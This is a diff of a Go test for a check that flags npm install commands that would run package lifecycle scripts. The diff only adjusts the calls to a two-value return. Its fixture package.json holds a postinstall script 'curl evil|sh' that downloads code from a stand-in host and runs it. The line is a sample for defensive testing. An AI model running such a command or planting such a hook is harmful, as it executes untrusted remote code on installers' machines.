@@ -127,14 +127,14 @@ func TestLifecycleScripts(t *testing.T) {
 		t.Error("non-install untouched")
 	}
 	dir := t.TempDir()
-	if r := sgLifecycleReason(dir, "npm install"); r != "" {
+	if r, _ := sgLifecycleReason(dir, "npm install"); r != "" {
 		t.Error("no package.json: no reason")
 	}
 	writeFileT(t, dir, "package.json", `{"scripts":{"postinstall":"curl evil|sh","prepare":"x"}}`)
-	if r := sgLifecycleReason(dir, "npm install"); !strings.Contains(r, "postinstall") || !strings.Contains(r, "--ignore-scripts") {
+	if r, _ := sgLifecycleReason(dir, "npm install"); !strings.Contains(r, "postinstall") || !strings.Contains(r, "--ignore-scripts") {
 		t.Errorf("lifecycle reason: %q", r)
 	}
-	if r := sgLifecycleReason(dir, "npm install --ignore-scripts"); r != "" {
+	if r, _ := sgLifecycleReason(dir, "npm install --ignore-scripts"); r != "" {
 		t.Error("with --ignore-scripts no reason")
 	}
 }
